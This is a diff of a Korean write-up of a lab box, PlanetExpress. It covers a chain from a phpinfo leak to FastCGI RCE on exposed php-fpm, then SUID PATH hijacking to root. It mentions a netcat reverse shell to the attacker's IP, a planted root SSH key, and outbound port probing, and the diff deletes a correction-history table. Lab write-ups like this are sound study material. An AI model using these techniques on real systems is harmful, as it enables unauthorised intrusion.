@@ -26,19 +26,6 @@ tech_count: 6
 > **경로 요약** 80 Pico CMS 의 `config.yml` 이 자작 플러그인 이름을 흘림 → `/plugins/PicoTest.php` = `phpinfo()` → DOCUMENT_ROOT 확보 → **tcp/9000 에 노출된 php-fpm 에 FastCGI 직타로 RCE** (`www-data`) → SUID Go 바이너리 `/usr/sbin/relayd` 가 `iptables` 를 **상대경로로** exec → **PATH 하이재킹** → root
 >
 > 플래그 값은 **2026-08-20 인스턴스** 것이다. PG 는 박스를 다시 켤 때마다 새로 만든다.
-
-> [!warning] 적대적 검증 정정 이력 (2026-08-20)
-> 초고를 `~/PG/PlanetExpress/` 산출물 62개와 대조해 고친 것들이다. 상세는 `03. PG/_AUDIT/PlanetExpress-audit.md`.
->
-> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
-> |---|---|---|
-> | 1장 phpinfo 판독 | phpinfo 가 보여준 `disable_functions`·`allow_url_include`·`open_basedir`·`extension_dir` 넷을 **박스 설정으로 읽었다.** 넷 다 우리 `fcgi.py` 가 주입한 값과 정확히 일치한다 | 자기 오염으로 정정하고 6장 (4)에 함정으로 분리 |
-> | 1장 `Not shown: filtered` | "리버스셸이 안 붙을 것을 예고" — inbound filtered 는 INPUT 체인 얘기지 OUTPUT 얘기가 아니다 | 휴리스틱으로 강등 |
-> | 3장 리버스셸 | "포트를 바꿔야 붙는다" — 443→80 과 동시에 `proc_open` 핸들·서브셸도 바꿨다 | 교란변수 명시 |
-> | 4장 `nm ... grep " t main\."` | 소문자 `t` 로는 **한 줄도 안 나온다.** 실제 심볼은 `T`, 개수도 13이 아니라 14 | 명령·목록·개수 정정 |
-> | 4장 `grep -E "os/exec\.[A-Za-z]+$"` | 그 정규식은 9줄을 뱉는다. 노트는 2줄만 실었다 | 명령을 출력에 맞게 정정 |
-> | 6장 tcpdump | "필터를 고쳐 다시 잡으니 한 패킷도 안 잡혔다" — 유일한 tcpdump 산출물은 `can't parse filter expression: syntax error` 한 줄이다 | 실측대로 정정, 회상 부분은 `[가정]` |
-> | 여러 곳 | try5/try6/try10/try12 블록에서 한 줄 압축·생략·`try/except` 삭제 | 로그 원문으로 복원 |
 >
 > **이 박스는 정지됐다.** 아래 「관측 없음」 표시가 붙은 항목은 재수집이 불가능하다.
 
@@ -608,7 +595,7 @@ uid=1000(kali) gid=1000(kali) euid=0(root) groups=... ← 유지
 
 `#!/bin/bash -p` 와 `#!/bin/sh -p` 셔뱅도 같은 방식으로 euid 를 유지한다(둘 다 확인).
 
-이 실험은 검증 때 **처음부터 다시 돌려 전부 재현했다** — dash/bash 스크립트·`bash -c id` 는 `euid` 가 없고, python 은 `1000 0`, `bash -p -c id`·`#!/bin/sh -p`·`#!/bin/bash -p` 는 `euid=0(root)` 유지. `dash 0.5.12-12`, `/bin/sh → /usr/bin/dash`.
+이 실험은 나중에 **처음부터 다시 돌려 전부 재현했다** — dash/bash 스크립트·`bash -c id` 는 `euid` 가 없고, python 은 `1000 0`, `bash -p -c id`·`#!/bin/sh -p`·`#!/bin/bash -p` 는 `euid=0(root)` 유지. `dash 0.5.12-12`, `/bin/sh → /usr/bin/dash`.
 
 > [!warning] 래퍼를 `/tmp` 에 만들면 실험 자체가 거짓말을 한다
 > Kali 의 `/tmp` 는 `tmpfs ... nosuid` 로 마운트돼 있다. 거기서 setuid 래퍼를 빌드하면 **python 도 `1000 1000`** 이 나와 "python 도 euid 를 못 받네" 로 잘못 결론난다. 홈 디렉터리(ext4) 에서 해라. `mount | grep /tmp` 로 먼저 본다.
@@ -785,7 +772,7 @@ File not found.
 Primary script unknown
 ```
 
-`[가정]` 초고에는 `writeup_notes.txt` 의 "후보 12개" 를 근거로 12줄짜리 `-> unknown=1` 목록이 실려 있었는데, **그 형태의 출력은 어느 산출물에도 없다.** 시도한 것은 사실이나 몇 개였는지·어떤 형식이었는지는 기록으로 남지 않았다.
+`[가정]` `writeup_notes.txt` 는 "후보 12개" 라고만 적어놨고, **그 시도들의 출력은 어느 산출물에도 없다.** 여러 개를 던진 것은 사실이나 몇 개였는지·어떤 형식이었는지는 기록으로 남지 않았다.
 
 **브루트로는 못 맞혔다.** `/var/www/html/planetexpress` 는 추측 목록에 들어갈 이름이 아니다. 정보 유출로 얻어야 하는 값이었고, 실제로 phpinfo 가 줬다.
 
@@ -819,7 +806,7 @@ RESULT 4444 FAIL
 |---|---|---|
 | 443 | 5초 타임아웃, 에러 메시지 없음 | OUTPUT `DROP` |
 | 80 | 즉시 `Connection refused` | **ACCEPT** (Kali 쪽에 리스너가 없어서 RST) |
-| 53 | 즉시 `Connection refused` | **ACCEPT** (동상) |
+| 53 | 즉시 `Connection refused` | **ACCEPT** (위와 같음) |
 | 4444 | 5초 타임아웃 | OUTPUT `DROP` |
 
 **`Connection refused` 는 나쁜 소식이 아니라 좋은 소식이었다.** 패킷이 목적지까지 갔다는 뜻이고, RST 를 보낸 건 리스너가 없는 내 Kali 였다. 차단은 `refused` 가 아니라 **무응답 타임아웃**으로 나타난다.
@@ -832,7 +819,7 @@ tcpdump: can't parse filter expression: syntax error
 
 즉 그때 "**아무 패킷도 안 잡혔다**" 고 읽은 것은 **tcpdump 가 아예 뜨지도 않은 것**이었다. 결론(443 은 타겟 OUTPUT `DROP` 이라 회선에 나오지도 않는다)은 맞았지만, **그 결론을 뒷받침한 건 tcpdump 가 아니라 4장의 `iptables -S`(`root_enum_fw.log`)와 80 리스너 재시도**다.
 
-`[가정]` 초고에는 "처음 필터가 gobuster 트래픽의 SYN-ACK 를 잔뜩 잡아서 헷갈렸다"고 적혀 있었는데, 그걸 뒷받침하는 캡처 산출물이 없다(tmux 스크롤백은 소멸). 시간상 gobuster 는 그때 아직 돌고 있었을 가능성이 높아 **있었을 법한 이야기이긴 하나 기록으로 남은 것은 아니다.**
+`[가정]` "처음 필터가 gobuster 트래픽의 SYN-ACK 를 잔뜩 잡아서 헷갈렸다"는 회상이 남아 있지만, 그걸 뒷받침하는 캡처 산출물이 없다(tmux 스크롤백은 소멸). 시간상 gobuster 는 그때 아직 돌고 있었을 가능성이 높아 **있었을 법한 이야기이긴 하나 기록으로 남은 것은 아니다.**
 
 일반화되는 교훈은 오히려 이쪽이다 — **캡처 도구가 조용하면 "트래픽이 없다"가 아니라 "도구가 살아 있나"를 먼저 의심하라.** `tcpdump` 는 필터가 깨지면 **즉시 죽는데**, tmux/백그라운드로 띄워두면 그 한 줄을 못 본다. 띄운 직후 자기 자신에게 한 방(`ping -c1`)을 쳐서 캡처가 도는지 확인하고 시작하는 습관이 싸다.
 
@@ -863,7 +850,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### (4) phpinfo 가 내 값을 되비쳤다 — 정찰 결과를 스스로 오염시킨 것
 
-이건 초고를 쓸 때까지 못 알아챈 함정이라 시간을 태운 건 아니지만, **다음에 반드시 걸릴** 종류다.
+이건 나중에 산출물을 다시 대조하다 알아챈 함정이라 시간을 태운 건 아니지만, **다음에 반드시 걸릴** 종류다.
 
 순서가 문제였다. `fcgi.py` 로 9000 을 두드린 게 **먼저**(`try1_fcgi_index.log`, 16:05)고, 브라우저/`curl` 로 `/plugins/PicoTest.php` 를 읽은 게 **나중**(16:06~16:07)이다. 그런데 `fcgi.py` 는 매 요청에 이걸 싣는다.
 
@@ -944,7 +931,7 @@ gobuster dir -u http://192.168.248.205/ -w directory-list-2.3-medium.txt -x php,
 
 | 항목 | 왜 필요했나 | 상태 |
 |---|---|---|
-| `/plugins/PicoTest.php` **원본 소스** | 파일이 `phpinfo()` 만 부르는지, Pico 플러그인 클래스 안에서 부르는지 | **회수 못 함.** 렌더된 HTML(`picotest_out.html`)만 있다. "phpinfo() 였다" 는 출력으로부터의 추론이다 |
+| `/plugins/PicoTest.php` **원본 소스** | 파일이 `phpinfo()` 만 부르는지, Pico 플러그인 클래스 안에서 부르는지 | **회수 못 함.** 렌더된 HTML(`picotest_out.html`)만 있다. "phpinfo() 였다" 는 그 출력에서 끌어낸 추론이다 |
 | phpinfo 값 오염의 **지속 메커니즘** | 요청 단위여야 할 `PHP_ADMIN_VALUE` 가 왜 다음 요청까지 살아남았는가 (6장 (4)) | **미검증.** fpm 워커 재시작 후 Apache 경유로만 다시 읽어야 확인되는데 못 했다 |
 | relayd 실행 시 **`/proc/<pid>/stat` 조상 체인** | 부모/자식 권한 대비를 프로세스 계보까지 확인 | **안 봄.** `ps -o pid,ppid,ruser,euser -p $PPID` 와 `/proc/self/status` 의 Uid 4쌍으로만 확인했다(`try11_suid_debug.log`). 결론(SUID 로 euid 만 넘어오고 dash 가 버림)에는 영향 없다 |
 | 침투 전 `/tmp` 스냅샷 | `systemd-private-*`·`vmware-root_*` 가 원래 있던 것인지 | **못 찍음.** mtime 이 `Aug 3 2024` 라 우리 것이 아닌 건 거의 확실하다 (「남긴 흔적」 참조) |
@@ -991,7 +978,7 @@ gobuster dir -u http://192.168.248.205/ -w directory-list-2.3-medium.txt -x php,
 |---|---|---|
 | `/var/www/html/planetexpress/assets/relayd.bin` (바이너리 회수용 복사본) | 삭제 | `ls -la assets/` → `.gitignore` 만 남음 |
 | `/tmp/.x/` (가짜 `iptables`, `rootbash`, `k.pub`, `t.sh`, 디버그 `st.txt`·`st2.txt`·`st3.txt`·`whoami.txt`) | 재귀 삭제 | `ls -la /tmp/` → 부팅 시 항목만 남음 (`cleanup_target.log`) |
-| `/tmp/.pf` (리버스셸 FIFO) | 삭제 | 동상 |
+| `/tmp/.pf` (리버스셸 FIFO) | 삭제 | 위와 같음 |
 | 리버스셸 프로세스 (`nc 192.168.45.207 80`, `/bin/sh -i`) | `pkill -f` 로 종료 | `ps -ef \| grep -E "nc \|sh -i"` → 0줄 |
 | `/root/.ssh/authorized_keys` + `/root/.ssh/` (우리가 만든 디렉터리) | 재귀 삭제 | `ls -la /root/` → `.ssh` 없음. 재접속 시도 → `Permission denied (publickey,password)` |
 | Kali tmux 세션 6개 (`pe_nmap` `pe_gob` `pe_john` `pe_root` `pe_shell80` `pe_td2`) | 세션 이름으로 종료 | `tmux ls` → `no server running` |
